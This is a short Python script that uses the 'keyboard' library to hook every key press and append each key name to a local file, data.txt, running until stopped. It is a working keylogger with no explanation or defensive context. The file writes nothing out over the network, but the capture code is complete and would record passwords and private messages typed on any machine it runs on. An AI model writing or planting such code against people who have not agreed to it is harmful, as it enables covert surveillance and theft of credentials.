import keyboard

def pressKey(key):
    with open('data.txt', 'a', encoding="utf-8") as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressKey)
keyboard.wait()